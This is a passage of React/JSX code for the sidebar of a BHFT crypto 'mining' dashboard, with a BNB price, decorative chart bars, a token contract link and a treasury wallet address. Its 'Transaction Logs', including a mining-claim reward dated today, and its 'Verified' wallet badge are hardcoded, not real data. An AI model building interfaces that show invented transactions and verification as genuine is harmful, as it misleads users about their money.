            <div className="flex items-center justify-between mb-4">
              <span className="text-sm font-bold text-white">BNB / USDT</span>
              <span className="text-sm text-[#00C087] font-semibold mono">${bnbPrice.toFixed(2)}</span>
            </div>
            <div className="h-[100px] w-full bg-[#1E2329] rounded flex items-end gap-1 p-2 border border-[rgba(255,255,255,0.08)]">
              <div className="bg-[#00C087]/40 w-full h-[40%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[55%] rounded-t"></div>
              <div className="bg-red-500/40 w-full h-[45%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[70%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[85%] rounded-t"></div>
              <div className="bg-red-500/40 w-full h-[60%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[75%] rounded-t"></div>
            </div>
          </div>

          <div className="p-6 overflow-y-auto max-h-[300px]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-4">Transaction Logs</p>
            <div className="space-y-4 mono text-[10px]">
              <div className="flex justify-between items-start opacity-70">
                <div>
                  <p className="text-white">MINING_CLAIM_SUCCESS</p>
                  <p className="text-[#848E9C]">{new Date().toLocaleDateString()}</p>
                </div>
                <span className="text-[#00C087]">+{((dailyBHFT || 0.10) * 0.25).toFixed(4)} BHFT</span>
              </div>
              <div className="flex justify-between items-start opacity-70">
                <div>
                  <p className="text-white">NODE_SYNC_COMPLETE</p>
                  <p className="text-[#848E9C]">BSC Chain ID: 56</p>
                </div>
                <span className="text-[#F3BA2F]">0.0</span>
              </div>
              <div className="flex justify-between items-start opacity-70">
                <div>
                  <p className="text-white">ACCOUNT_INITIALIZED</p>
                  <p className="text-[#848E9C]">Fresh Start (Tier 1)</p>
                </div>
                <span className="text-[#00C087]">0.00 BHFT</span>
              </div>
            </div>
          </div>
        </div>

        <div className="p-6 bg-[#181A20] border-t border-[rgba(255,255,255,0.08)] space-y-3">
          <div>
            <div className="flex items-center justify-between text-[11px] text-[#848E9C] mb-1">
              <span>BHFT Token Contract</span>
              <span className="text-[#F3BA2F] font-bold">BEP-20</span>
            </div>
            <a 
              href={`https://bscscan.com/token/${BHFT_TOKEN_ADDRESS}`} 
              target="_blank" 
              rel="noopener noreferrer"
              className="mono text-[10px] text-amber-400/90 hover:text-amber-300 break-all flex items-center gap-1 transition"
            >
              <span>{BHFT_TOKEN_ADDRESS}</span>
              <ExternalLink className="w-3 h-3 shrink-0" />
            </a>
          </div>
          <div>
            <div className="flex items-center justify-between text-[11px] text-[#848E9C] mb-1">
              <span>Treasury Receiver Wallet</span>
              <span className="text-[#00C087]">Verified</span>
            </div>
            <p className="mono text-[10px] text-white/40 break-all">{user.treasuryWalletAddress || TREASURY_WALLET}</p>
          </div>
        </div>
      </aside>

    </div>
  );
};


